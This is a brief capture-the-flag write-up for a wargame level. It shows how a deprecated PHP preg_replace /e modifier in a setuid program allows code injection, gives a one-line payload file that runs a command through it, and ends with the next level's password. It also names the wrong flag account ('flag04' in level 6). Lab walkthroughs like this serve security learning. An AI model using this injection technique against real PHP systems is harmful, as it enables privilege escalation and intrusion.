### Level06

We have an executable and a .php file in the HOME. In the 2nd file, we can see a call to `preg_replace` with the deprecated flag `/e`. This flag will then allows us to make a call to exec with the rights of flag04. But to do this our argument need to match with the regex in this line `$a = preg_replace("/(\[x (.*)\])/e", "y(\"\2")", $a);`. 

Let's start by creating our file: ``echo '[x {${`getflag`}}' > /tmp/exploit``.

Now we just need to run `./level06` with `/tmp/exploit` as an argument

We just have to connect to the level07 with `wiok45aaoguiboiki2tuin6ub` as password
